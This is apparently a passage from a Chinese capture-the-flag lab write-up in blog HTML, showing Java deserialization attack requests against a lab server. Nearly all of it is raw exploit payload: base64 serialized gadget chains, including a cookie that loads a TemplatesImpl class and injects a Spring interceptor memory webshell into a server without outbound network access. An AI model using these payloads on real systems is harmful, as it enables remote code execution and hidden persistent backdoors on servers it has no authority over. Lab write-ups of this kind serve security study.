AEkGvQAMTRINuAAOtgAPEhC2ABGZABAsAxISUywEEhNTpwANLAMSFFMsBBIVUywFsgAIU7sAB1m4ABYstgAXtgAYtwAZuAAKpwAES7EAAQAAALcAugAaAAMARAAAAD4ADwAAABIAWAAUAGUAFQBoABcAcQAYAHYAGQCGABoAiwAbAJMAHQCYAB4AnQAgAKMAIQC3ACYAugAlALsAJwBFAAAADAABAHYAQQBJAEoAAgBLAAAAHAAK/QAkBwBMAQ0KGg/<span class="number">8</span>ACoHAE0J+AAZQgcATgAACgBPAFAAAgBDAAACTQAHAAoAAAFnuAAbtgAcEh22AB5MKxIfA70AILYAIU0sAQO9ACK2ACNOuAAbtgAcEiS2AB5MKxIlA70AILYAIU0sLQO9ACK2ACM6BLgAG7YAHBImtgAeEicDvQAgtgAoOgUZBLYAKRIqBb0AIFkDEgxTWQQSDFO2ACg6BhkGBLYAKxkFBLYAKxkFGQQDvQAitgAjOgeyACw6CAI2CRkItgADqwAAAAAAOAAAAAK3NOKNAAAAGwAuOaIAAAArGQgSLbYABZkAFgM2CacAEBkIEi62AAWZAAYENgkVCasAAACTAAAAAgAAAAAAAAAZAAAAAQAAADoZBhkEBb0AIlkDsgAvU1kEKhIwtgAxtgAyU7YAI1enAFwZB7YAKRIzBL0AIFkDEgxTtgAoGQcEvQAiWQMqEjC2ADG2ADJTtgAjVxkHtgApEjQDvQAgtgAoGQcDvQAitgAjVxkHtgApEjUDvQAgtgAoGQcDvQAitgAjV7EAAAADAEQAAABKABIAAAApAAwAKgAXACsAIQAsAC0ALQA4AC4AQwAvAFkAMABzADEAeQAyAH8AMwCMADUA7AA3AQoAOAENADoBNgA7AU4APAFmAD8ARQAAAFIACAAAAWcAUQBSAAAADAFbAFMAVAABABcBUABVAFYAAgAhAUYAVwBYAAMAQwEkAFkAWAAEAFkBDgBaAFYABQBzAPQAWwBWAAYAjADbAFwAWAAHAEsAAAAsAAb/ALQACgcAXQcAXgcAXwcAYAcAYAcAXwcAXwcAYAcATAEAAA8MGiD5AFgAYQAAAAQAAQAaAAgAYgBCAAEAQwAAAEQAAQAAAAAAGBI2swAvEjezAAgSOLMAAhI5swAsuAA6sQAAAAEARAAAABoABgAAAAcABQAIAAoACQAPAAoAFAAMABcADQABAGMAAAACAGR1cQB+ABgAAADyyv66vgAAADEAEwEAA0ZvbwcAAQEAEGphdmEvbGFuZy9PYmplY3QHAAMBAApTb3VyY2VGaWxlAQAIRm9vLmphdmEBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQcABwEAEHNlcmlhbFZlcnNpb25VSUQBAAFKBXHmae48bUcYAQANQ29uc3RhbnRWYWx1ZQEABjxpbml0PgEAAygpVgwADgAPCgAEABABAARDb2RlACEAAgAEAAEACAABABoACQAKAAEADQAAAAIACwABAAEADgAPAAEAEgAAABEAAQABAAAABSq3ABGxAAAAAAABAAUAAAACAAZwdAACwZBwdwEAeHcEAAAAAXg=</span><br><span class="line">Connection: keep<span class="literal">-alive</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/8.png"></p>
<p>拿到flag</p>
<h4 id="不出网打内存马"><a href="#不出网打内存马" class="headerlink" title="不出网打内存马"></a>不出网打内存马</h4><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/9.png"></p>
<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/10.png"></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /mail/u/<span class="number">0</span>/ HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">39.99</span>.<span class="number">157.159</span>:<span class="number">8080</span></span><br><span class="line">Accept<span class="literal">-Language</span>: zh<span class="literal">-CN</span>,zh;q=<span class="number">0.9</span></span><br><span class="line">Cookie: userInfo=rO0ABXNyAC7BqsGhwbbBocCuwbXBtMGpwazArsGQwbLBqcGvwbLBqcG0wbnBkcG1waXBtcGllNowtPs/grEDAAJJAAjBs8GpwbrBpUwAFMGjwa/BrcGwwaHBssGhwbTBr8GydAAswYzBqsGhwbbBocCvwbXBtMGpwazAr8GDwa/BrcGwwaHBssGhwbTBr8GywLt4cAAAAAJzcgCEwa/BssGnwK7BocGwwaHBo8GowaXArsGjwa/BrcGtwa/BrsGzwK7Bo8GvwazBrMGlwaPBtMGpwa/BrsGzwLTArsGjwa/BrcGwwaHBssGhwbTBr8GywbPArsGUwbLBocGuwbPBpsGvwbLBrcGpwa7Bp8GDwa/BrcGwwaHBssGhwbTBr8GyL/mE8CuxCMwCAAJMABLBpMGlwaPBr8GywaHBtMGlwaRxAH4AAUwAFsG0wbLBocGuwbPBpsGvwbLBrcGlwbJ0AFrBjMGvwbLBp8CvwaHBsMGhwaPBqMGlwK/Bo8Gvwa3BrcGvwa7Bs8CvwaPBr8GswazBpcGjwbTBqcGvwa7Bs8C0wK/BlMGywaHBrsGzwabBr8Gywa3BpcGywLt4cHNyAIDBr8GywafArsGhwbDBocGjwajBpcCuwaPBr8Gtwa3Br8GuwbPArsGjwa/BrMGswaXBo8G0wanBr8GuwbPAtMCuwaPBr8GtwbDBocGywaHBtMGvwbLBs8CuwYPBr8GtwbDBocGywaHBosGswaXBg8Gvwa3BsMGhwbLBocG0wa/Bsvv0mSW4brE3AgAAeHBzcgB2wa/BssGnwK7BocGwwaHBo8GowaXArsGjwa/BrcGtwa/BrsGzwK7Bo8GvwazBrMGlwaPBtMGpwa/BrsGzwLTArsGmwbXBrsGjwbTBr8GywbPArsGJwa7BtsGvwavBpcGywZTBssGhwa7Bs8Gmwa/BssGtwaXBsofo/<span class="number">2</span>t7fM44AgADWwAKwanBgcGywafBs3QAJsGbwYzBqsGhwbbBocCvwazBocGuwafAr8GPwaLBqsGlwaPBtMC7TAAWwanBjcGlwbTBqMGvwaTBjsGhwa3BpXQAJMGMwarBocG2waHAr8GswaHBrsGnwK/Bk8G0wbLBqcGuwafAu1sAFsGpwZDBocGywaHBrcGUwbnBsMGlwbN0ACTBm8GMwarBocG2waHAr8GswaHBrsGnwK/Bg8GswaHBs8GzwLt4cHVyACbBm8GMwarBocG2waHArsGswaHBrsGnwK7Bj8GiwarBpcGjwbTAu5DOWJ8QcylsAgAAeHAAAAAAdAAcwa7BpcG3wZTBssGhwa7Bs8Gmwa/BssGtwaXBsnVyACTBm8GMwarBocG2waHArsGswaHBrsGnwK7Bg8GswaHBs8GzwLurFteuy81amQIAAHhwAAAAAHcEAAAAA3NyAHTBo8Gvwa3ArsGzwbXBrsCuwa/BssGnwK7BocGwwaHBo8GowaXArsG4waHBrMGhwa7ArsGpwa7BtMGlwbLBrsGhwazArsG4wbPBrMG0waPArsG0wbLBocG4wK7BlMGlwa3BsMGswaHBtMGlwbPBicGtwbDBrAlXT8FurKszAwAGSQAawZ/BqcGuwaTBpcGuwbTBjsG1wa3BosGlwbJJABzBn8G0wbLBocGuwbPBrMGlwbTBicGuwaTBpcG4WwAUwZ/BosG5wbTBpcGjwa/BpMGlwbN0AAbBm8GbwYJbAAzBn8GjwazBocGzwbNxAH4AC0wACsGfwa7BocGtwaVxAH4ACkwAIsGfwa/BtcG0wbDBtcG0wZDBssGvwbDBpcGywbTBqcGlwbN0ACzBjMGqwaHBtsGhwK/BtcG0wanBrMCvwZDBssGvwbDBpcGywbTBqcGlwbPAu3hwAAAAAP////<span class="number">91</span>cgAGwZvBm8<span class="built_in">GCS</span>/<span class="number">0</span>ZFWdn2zcCAAB4cAAAAAJ1cgAEwZvBgqzzF/gGCFTgAgAAeHAAAD07yv66vgAAADQAaAoAFAA0CAA1CgAFADYIAB4HADcHACEKAAUAOAoAOQA6CgA7ADwIAD0KAD4APwoABQBACgBBADoHAEIKAEMARAoAQQBFCgA5AEYKAAUARwcASAcASQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAhTHBheWxvYWQvVGVtcGxhdGVJbXBsQ2xhc3NMb2FkZXI7AQAGbG9hZGVyAQARTGphdmEvbGFuZy9DbGFzczsBAAtkZWZpbmVDbGFzcwEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAEY29kZQEAAltCAQALY29uc3RydWN0b3IBAB9MamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3I7AQAKRXhjZXB0aW9ucwcASgEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHAEsBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBABxUZW1wbGF0ZUltcGxDbGFzc0xvYWRlci5qYXZhDAAVABYBAE5jb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UZW1wbGF0ZXNJbXBsJFRyYW5zbGV0Q2xhc3NMb2FkZXIMAEwATQEAD2phdmEvbGFuZy9DbGFzcwwATgBPBwBQDABRAFIHAFMMAFQAVwEztHl2NjZ2Z0FBQURFQlNBRUFJbU52YlM5bVlYTjBaWEo0Yld3dmFtRmphM052Ymk5bVppOUdhV3hsVlhScGJITUhBQUVCQUVCamIyMHZjM1Z1TDI5eVp5OWhjR0ZqYUdVdmVHRnNZVzR2YVc1MFpYSnVZV3d2ZUhOc2RHTXZjblZ1ZEdsdFpTOUJZbk4wY21GamRGUnlZVzV6YkdWMEJ3QURBUUFOWjJWMFZYSnNVR0YwZEdWeWJnRUFGQ2dwVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3QVFBRVEyOWtaUUVBRDB4cGJtVk9kVzFpWlhKVVlXSnNaUUVBRWt4dlkyRnNWbUZ5YVdGaWJHVlVZV0pzWlFFQUJIUm9hWE1CQUNSTVkyOXRMMlpoYzNSbGNuaHRiQzlxWVdOcmMyOXVMMlptTDBacGJHVlZkR2xzY3pzQkFBSXZLZ2dBREFFQURHZGxkRU5zWVhOelRtRnRaUUVBTTJOdmJTNW1ZWE4wWlhKNGJXd3VhbUZqYTNOdmJpNUJZbk4wY21GamRFMWhkR05vWlhKTWRtbEpiblJsY21ObGNIUnZjZ2dBRHdFQUQyZGxkRUpoYzJVMk5GTjBjbWx1WndFQUNrVjRZMlZ3ZEdsdmJuTUJBQk5xWVhaaEwybHZMMGxQUlhoalpYQjBhVzl1QndBVEFRQVFhbUYyWVM5c1lXNW5MMU4wY21sdVp3Y0FGUUVKc0VnMGMwbEJRVUZCUVVGQlFVRktNVmdyTTJOVWVIaFlLMUpuSzNaclNsZFJhVUZEVnpOUldrbEJOVVpyYzBGb01tSk1RMVJuUnpCTlpISkRaRVpKUjNBMEwxTjRhMnRoVjNOTWQzSmtiR015WW5CMVZYQnRiV0k1U20wd1lXUnlNRzVpTlVsRE5sVnJRbEpzUTFFcmJtbzVTV1lyVVhvek9YQmxhek4xTjB4M1VUWTFlbVYxZVhwUE0xQnVlbkl4TTNaMmRtUlBOblF2TDNWbE9USjNRV1Y0WkRoR1QzSlFiV0pEY1hZeU5EWXdlbk1yVjFWdFpqRTNTWGgwUjNGdUsycFBNVmxsZEZsYU1EVXhjMUZXY1dwak9GVlNaM2x3V2xkWVdrMVRORTFSTWtod1YyNDVUbFJLWkRKWlZHY3lWMlJPYzJWT1psZGpOVXBLWm05TlpUQndiRTR5TWxOdllUQXpiRXh1TlZoNmNHcFhWRzF3WlZwc1F6SjBkVnBLTUZWMk16Sm5jRVZrTVc4eFkxTldiM0kzUVZsR2VFUlNkSGcyWTBkRmNVOXlTRkJSU2tKQllrNXVRbFJaVUVadk1EVklhR3hPYVU5MFZUTnhiVkpGYkRBeFRYcHhjRkZ1WkV0eGNEVlVVbWgzUTJ0V1lqUk1TRkl2SzA5SlpFTlplVUZ5Tm5CQldVaHRiazE2Vkc5U2RVVjNTR0pIVG1wTGVVNXliMGszYzFBNVdWRlJVVVpYYURaMlIyZFZibE5qUmxkMVQzSTVWSGxaSzJoSlZHUktRMngwV0ZoWFNUTm5RVmMxVnpGR1owWXZVRVJIYURWeE1YRXphV0YzY1ZkNFNrUjZlVUp1VDJablprSXpZV2QxVDFWVk9FNDRjRVF6UWxOWWJYVkpiVEp1WWpCTk1YVXlkMkYwZFhoaVJuTXZWRzFpVFhrMkwxRnNibWhZV1dOc1l6WmtSalJvVmtSUlRrUlVjMFZPUm5aaFRtbGpRMDg1WmpNMFIyOVJWV0lyV2s5aGRYazFlSEZ5VDAxV1UyRnJkM1pWTnpZeGRHcFdja3hTUkRjeFIwTjRla2g0VVhKc2JHVTRRVXRRWmsxb1ZFTnZVM015YTJ0RlRtOWhiV1J0V2paTGJtaHJWa1Y0WVVFMFJFRlFWMjFJY0VkSGQwNVhZVVpETVVwc1lWcDZZMWh5YTJvM1UycFRUVE4yTnpCTVJVcFFjVkZGWkc0cmIzbEVWVGg1YzFKUFV6Sm1XWFJUZVhkS056ZFhZa3RMVW5Bd05UQk9aVTFCU0dsT1VIWmhaMjA1UmtwR1VuUkVhbEpZUWxFMFREZFdkWHBVTUVWeGFYTmhWR2cyTUZORGJESXhZWGQwUzBKaVlWSlhWV3RhV0UxbVVWTlFORFJyZHl0clFUSm9lR3htWldsdVprUTRWVlJITWxVNFoybFFiMVk0UjNocFR6WXZiUzlTYUROVE5GRlRkekZJZDNob1ExZDNhRGRwVUVGTFZHMW5XVXBzZGt0R1YySXJXVWg0ZEZGb2NIZGtTekJ2WjNGa2QyOW9hMnBIUVRCb1NITkpkVEZzYzJ4b1IyWlpSbk52YzNOM2FFOWxkbWxyUWxJM09ETTRabEZqU25CdlRWSm5XRmRJUzNoUlYxbGhVazFUVTFCWlRsQk9SMDFEYTNwNFRDOHhRVFpvUzJ4aFNXRXhhWFZ2V2xCTmJtNUZaSE5UZDBoYU1uZERlVlJYZW1ZM2NVdHZibWN3TDJoTlIwb3JRMHh5UW1wb1dVcGtiSFJzVlZkdFdYUTJXbmxSUXpKdVQwNU1SR3BvVDJodldVMUhVbnBJYzJkdWNHZGhhVVZCYVhKNFNUZzNabGN5UW04M1pEZHNUVTFKZDJWWFlqQkRNVTV4VlRZMGJXNWhUV3gxZUdsek5VTnBhelZqTVZKS2JWWlVla2REZFVvMWNVZG5iMlYzU0ZWbGRXMVhaVXROSzJGelJVODBlSHB2V2xCUGNWSlJNWHBCZG1OMU4yWmtZWEJWUW5OeVdsWTJSbm95VUdoVVJHMDRaR3QzVlRremFWWmtha3BYYjFjeFRHMHdjbTF4YlVKVGFqUjJURnB1ZWpGeWFuWmxZbmxuYVZCelJtZFhNazVrVkZJNE1GY3dNbVZyTldSU1owbFFlRUowVnpVMVpuZFZhR2QyTkhOME1HNWxiblZQYVhGNk4yZFhNbkpXUmpaV1UzRXJhWEJrVm5CTEszZEpLMWhOV1RCV1JFd3ZSWGxWV21Wb1YzWjNOblp4UjBFdlYxbEZSMnRLU3pka2RXdHFVMGh1TnpsS2JWcFNSREZSYm1kT016RkZaMlpLWlRKWFRtZzJlVlpaTTJKTFRrZElPRWd6T0VsaVF5OTJjM001Ym5GcWRERlZNR0oxVWtWeVUyMXFNamRMTjJsM1dHUTJTRFpsTURZemRYQllOaXMyY25KbmMyazVSRlU0UlRWV1ZWbGhUblJtTkRCaFIwdDJiVkJCZEZKeVEwd3JaM0ppT1ZrMk5pczBUbVYxUVZOWldEWkdXRFoyZWk5alluSlZRamRKVm1kb2RuTjZaRkJ5VmtoWU9FUjFVRUl5VUZOTFdtYzFaMU5OVG5aTGVtUjBkSGwyU21aTmJFRndZbmxNUkVOQmVTOXBPVU4xUVV0SFZESXhSbXhqVGxaM1ZtRXhkSFYxTkZZeWFWZHFWRzE2UW10bEsxWkRSSFpFVVhjeVZFUk9NVE5CT1dwRUsybFRiazVsZFd0TE5GRmhOMXBHWVU1cWRHMW9iazkzWWpZd01FNU1TRU5ST0RkM2JFVlFSREpRTWxOSU9HbFRia28xYm5FMmRTOUxaRmhSWmpGbk1USmtNMkp0WlVWSE5GUXhkRTV6YW5aMk5uQTJXR2hvU0VOSU9XZGtibFJMZGtGSVdDOUdUSFpKZDBGSmNtYzFOVTVPYkZJclYxRnNNUzgzY25aSVpsRmpOVWx0V0RVelRWUmFSVGxVTXpoaU1IQXlaVFYyZGpjeVNVeFdZelU0VTBoTlduaE9WbWRHV1RBNE4yNU9WVEJKUlRsM1JIVTJSalZ6TlhKd1VWZ3dXVEZWT0RsUlVqSnRNVXBPYzFoRlZYUkhMek4zWkhBMVRGSjJNWHBJTDIxVU1HSTVaSGcyU2pJMk5XSkRjblIzVUdKeldFOWFPVnBoTmpsU1drdDBkR1Z6ZERsaGMwUXhSa2g0WWswNWRWbHBVR0pIZWpoWmVsUjRjMGR6T0RSdE1uSkhVbVkwUzBJMmEwSnJNa3RRU1N0dlZWaGhkRkJZYTA0ck1pdHBNalJrTHpSUE1qZEZkelJQVmxoSU5GUmllbVZtYUU5RVFYSXlRbGQ0YVdGWVRWTjRNMjFCYzBkRU1VODBXbWRtV25wbll6TXhjMlpRYURCTU1VMWhRalpOWkhBMFRsSk9VRTkwU0RsTWEySjVVRkV5ZUZweFEzUTFRMkpXVDBseFEzUklia1pxUmxSb1dHdE1kbk5zYTBaYVZYRlFjbVZKZWpobFlXdHRaRzhyV1VwQlJsWXJOV2RoT1ZZNFlUQnhXSEV6YVRsV2FYZHBhQ3RqZFZsb1oySTRRaTlQV0VOYVNqbHRSbE0zYUVORFVETjFkVmgxV2tWMVFWSlRhRkE0VXpkS1puUnFUemRsZWtoTkwwbzVhVFZ1VjJ0VlRVSXJkazFEWmtkd1pqUnZXRXRHUjJ4bVVtaFlabEkzWlVrd1ZFTjNVemRKTmpjNFFrRTFZMUZCVEhoUVFtaHpjVmRCVVZkTE5XMHhaMUp4V0hGTGNtMUZVR1pSYkROR1QyTXJibnAwU3pCeFpXWlFiRlZYTDFBdlEwWlJNRGNyWlZCclZHTTBWa3N6WTFOa1ptSlZSM1p4Ym1GVVNFbHNXbVpGWVZCVFdFNHpRbmhpUnk4d2RDdEpUMHhzV0hob056RTRkakZRUmpSMlp5dDNhRXM1UjFoblpqZzFVQ3RoUml0aFV5OXpORTlVWm5CVU0wczRaVUZrZG1WbUsycEdNMFkwVUVoeVRFNVZTMnRsWjA5NFowNXlOQzkyUzA1elkwRTJUelJzYmlzeFYxaDFiMDAwZUdocFVEZzNjVFZWUldZeFFVVTRUVE56WXl0SVIySk9TRVZGWWl0eGF6TlJjekJDWVdnM1JrZEpiVm8xZFhnMU5HNWxRbXRvWkhodmJ6VnRSelZJTlc5WmRFbERSUzlwVWk5cGVDdHpTV2hTYTI5WE5FMDNUMjExZHpRM1pqaEZVRFpWWlRCalJGQXpRM0l4TUdSTVVETlNTbFJoUTJKbkx6UkNUMlpDY2xsMk9UWkRTVXMwWmpSQ1FVTjBWRzF1Y25WNlpsZEJOREl2WjNaUGNHaHdVRmRuTkVGQlFUMDlDQUFYQVFBR1BHbHVhWFErQVFBVktFeHFZWFpoTDJ4aGJtY3ZVM1J5YVc1bk95bFdEQUFaQUJvS0FCWUFHd0VBQXlncFZnRUFCMk52Ym5SbGVIUUJBQkpNYW1GMllTOXNZVzVuTDA5aWFtVmpkRHNCQUF0cGJuUmxjbU5sY0hSdmNnd0FHUUFkQ2dBRUFDRUJBQXBuWlhSRGIyNTBaWGgwQVFBVUtDbE1hbUYyWVM5c1lXNW5MMDlpYW1WamREc01BQ01BSkFvQUFnQWxBUUFPWjJWMFNXNTBaWEpqWlhCMGIzSU1BQ2NBSkFvQUFnQW9BUUFPWVdSa1NXNTBaWEpqWlhCMGIzSUJBQ2NvVEdwaGRtRXZiR0Z1Wnk5UFltcGxZM1E3VEdwaGRtRXZiR0Z1Wnk5UFltcGxZM1E3S1ZZTUFDb0FLd29BQWdBc0FRQVRhbUYyWVM5c1lXNW5MMFY0WTJWd2RHbHZiZ2NBTGdFQUVYSmxjWFZsYzNSQmRIUnlhV0oxZEdWekFRQUxhSFIwY0hKbGNYVmxjM1FCQUFkelpYTnphVzl1QVFBT2MyVnlkbXhsZEVOdmJuUmxlSFFCQUJOaGNIQnNhV05oZEdsdmJrTnZiblJsZUhSekFRQVpUR3BoZG1FdmRYUnBiQzlNYVc1clpXUklZWE5vVTJWME93RUFFbUZ3Y0d4cFkyRjBhVzl1UTI5dWRHVjRkQUVBQzJOc1lYTnpURzloWkdWeUFRQVhUR3BoZG1FdmJHRnVaeTlEYkdGemMweHZZV1JsY2pzQkFCVnFZWFpoTDJ4aGJtY3ZRMnhoYzNOTWIyRmtaWElIQURrQkFCQnFZWFpoTDJ4aGJtY3ZUMkpxWldOMEJ3QTdBUUFOVTNSaFkydE5ZWEJVWVdKc1pRRUFFR3BoZG1FdmJHRnVaeTlVYUhKbFlXUUhBRDRCQUExamRYSnlaVzUwVkdoeVpXRmtBUUFVS0NsTWFtRjJZUzlzWVc1bkwxUm9jbVZoWkRzTUFFQUFRUW9BUHdCQ0FRQVZaMlYwUTI5dWRHVjRkRU5zWVhOelRHOWhaR1Z5QVFBWktDbE1hbUYyWVM5c1lXNW5MME5zWVhOelRHOWhaR1Z5T3d3QVJBQkZDZ0EvQUVZQkFEeHZjbWN1YzNCeWFXNW5abkpoYldWM2IzSnJMbmRsWWk1amIyNTBaWGgwTG5KbGNYVmxjM1F1VW1WeGRXVnpkRU52Ym5SbGVIUkliMnhrWlhJSUFFZ0JBQWxzYjJGa1EyeGhjM01CQUNVb1RHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN0tVeHFZWFpoTDJ4aGJtY3ZRMnhoYzNNN0RBQktBRXNLQURvQVRBRUFGR2RsZEZKbGNYVmxjM1JCZEhSeWFXSjFkR1Z6Q0FCT0FRQU1hVzUyYjJ0bFRXVjBhRzlrQVFBNEtFeHFZWFpoTDJ4aGJtY3ZUMkpxWldOME8weHFZWFpoTDJ4aGJtY3ZVM1J5YVc1bk95bE1hbUYyWVM5c1lXNW5MMDlpYW1WamREc01BRkFBVVFvQUFnQlNBUUFLWjJWMFVtVnhkV1Z6ZEFnQVZBRUFDbWRsZEZObGMzTnBiMjRJQUZZQkFCRm5aWFJUWlhKMmJHVjBRMjl1ZEdWNGRBZ0FXQUVBUW05eVp5NXpjSEpwYm1kbWNtRnRaWGR2Y21zdWQyVmlMbU52Ym5SbGVIUXVjM1Z3Y0c5eWRDNVhaV0pCY0hCc2FXTmhkR2x2YmtOdmJuUmxlSFJWZEdsc2N3Z0FXZ0VBR0dkbGRGZGxZa0Z3Y0d4cFkyRjBhVzl1UTI5dWRHVjRkQWdBWEFFQUQycGhkbUV2YkdGdVp5OURiR0Z6Y3djQVhnRUFIR3BoZG1GNExuTmxjblpzWlhRdVUyVnlkbXhsZEVOdmJuUmxlSFFJQUdBQkFGMG9UR3BoZG1FdmJHRnVaeTlQWW1wbFkzUTdUR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdXMHhxWVhaaEwyeGhibWN2UTJ4aGMzTTdXMHhxWVhaaEwyeGhibWN2VDJKcVpXTjBPeWxNYW1GMllTOXNZVzVuTDA5aWFtVmpkRHNNQUZBQVlnb0FBZ0JqQVFBeGIzSm5Mbk53Y21sdVoyWnlZVzFsZDI5eWF5NWpiMjUwWlhoMExuTjFjSEJ2Y25RdVRHbDJaVUpsWVc1elZtbGxkd2dBWlFFQUMyNWxkMGx1YzNSaGJtTmxEQUJuQUNRS0FGOEFhQWdBTkFFQUJXZGxkRVpXREFCckFGRUtBQUlBYkFFQUYycGhkbUV2ZFhScGJDOU1hVzVyWldSSVlYTm9VMlYwQndCdUFRQUlhWFJsY21GMGIzSUJBQllvS1V4cVlYWmhMM1YwYVd3dlNYUmxjbUYwYjNJN0RBQndBSEVLQUc4QWNnRUFFbXBoZG1FdmRYUnBiQzlKZEdWeVlYUnZjZ2NBZEFFQUJHNWxlSFFNQUhZQUpBc0FkUUIzQVFBMWIzSm5Mbk53Y21sdVoyWnlZVzFsZDI5eWF5NTNaV0l1WTI5dWRHVjRkQzVYWldKQmNIQnNhV05oZEdsdmJrTnZiblJsZUhRSUFIa0JBQWhuWlhSRGJHRnpjd0VBRXlncFRHcGhkbUV2YkdGdVp5OURiR0Z6Y3pzTUFIc0FmQW9BUEFCOUFRQVFhWE5CYzNOcFoyNWhZbXhsUm5KdmJRRUFGQ2hNYW1GMllTOXNZVzVuTDBOc1lYTnpPeWxhREFCL0FJQUtBRjhBZ1FFQUlHcGhkbUV2YkdGdVp5OURiR0Z6YzA1dmRFWnZkVzVrUlhoalpYQjBhVzl1QndDREFRQXJhbUYyWVM5c1lXNW5MM0psWm14bFkzUXZTVzUyYjJOaGRHbHZibFJoY21kbGRFVjRZMlZ3ZEdsdmJnY0FoUUVBSDJwaGRtRXZiR0Z1Wnk5T2IxTjFZMmhOWlhSb2IyUkZlR05sY0hScGIyNEhBSWNCQUNCcVlYWmhMMnhoYm1jdlNXeHNaV2RoYkVGalkyVnpjMFY0WTJWd2RHbHZiZ2NBaVFFQUUycGhkbUV2YkdGdVp5OVVhSEp2ZDJGaWJHVUhBSXNCQUFsamJHRjZla0o1ZEdVQkFBSmJRZ0VBQzJSbFptbHVaVU5zWVhOekFRQWFUR3BoZG1FdmJHRnVaeTl5Wldac1pXTjBMMDFsZEdodlpEc0JBQVZqYkdGNmVnRUFFVXhxWVhaaEwyeGhibWN2UTJ4aGMzTTdBUUFCWlFFQUZVeHFZWFpoTDJ4aGJtY3ZSWGhqWlhCMGFXOXVPd3dBRGdBR0NnQUNBSlVNQUJFQUJnb0FBZ0NYQVFBTVpHVmpiMlJsUW1GelpUWTBBUUFXS0V4cVlYWmhMMnhoYm1jdlUzUnlhVzVuT3lsYlFnd0FtUUNhQ2dBQ0FKc0JBQTVuZW1sd1JHVmpiMjF3Y21WemN3RUFCaWhiUWlsYlFnd0FuUUNlQ2dBQ0FKOElBSThIQUk0QkFCRnFZWFpoTDJ4aGJtY3ZTVzUwWldkbGNnY0Fvd0VBQkZSWlVFVU1BS1VBa2drQXBBQ21BUUFSWjJWMFJHVmpiR0Z5WldSTlpYUm9iMlFCQUVBb1RHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN1cweHFZWFpoTDJ4aGJtY3ZRMnhoYzNNN0tVeHFZWFpoTDJ4aGJtY3ZjbVZtYkdWamRDOU5aWFJvYjJRN0RBQ29BS2tLQUY4QXFnRUFHR3BoZG1FdmJHRnVaeTl5Wldac1pXTjBMMDFsZEdodlpBY0FyQUVBRFhObGRFRmpZMlZ6YzJsaWJHVUJBQVFvV2lsV0RBQ3VBSzhLQUswQXNBRUFCM1poYkhWbFQyWUJBQllvU1NsTWFtRjJZUzlzWVc1bkwwbHVkR1ZuWlhJN0RBQ3lBTE1LQUtRQXRBRUFCbWx1ZG05clpRRUFPU2hNYW1GMllTOXNZVzVuTDA5aWFtVmpkRHRiVEdwaGRtRXZiR0Z1Wnk5UFltcGxZM1E3S1V4cVlYWmhMMnhoYm1jdlQySnFaV04wT3d3QXRnQzNDZ0N0QUxnQkFCWmhZbk4wY21GamRFaGhibVJzWlhKTllYQndhVzVuQVFBVFlXUmhjSFJsWkVsdWRHVnlZMlZ3ZEc5eWN3RUFGVXhxWVhaaEwzVjBhV3d2UVhKeVlYbE1hWE4wT3dFQUZreHZZMkZzVm1GeWFXRmliR1ZVZVhCbFZHRmliR1VCQUNsTWFtRjJZUzkxZEdsc0wwRnljbUY1VEdsemREeE1hbUYyWVM5c1lXNW5MMDlpYW1WamREcytPd0VBQjJkbGRFSmxZVzRJQUw4QkFCeHlaWEYxWlhOMFRXRndjR2x1WjBoaGJtUnNaWEpOWVhCd2FXNW5DQURCQ0FDN0FRQVRhbUYyWVM5MWRHbHNMMEZ5Y21GNVRHbHpkQWNBeEFFQUEyRmtaQUVBRlNoTWFtRjJZUzlzWVc1bkwwOWlhbVZqZERzcFdnd0F4Z0RIQ2dERkFNZ0JBQXhrWldOdlpHVnlRMnhoYzNNQkFBZGtaV052WkdWeUFRQUhhV2R1YjNKbFpBRUFDV0poYzJVMk5GTjBjZ0VB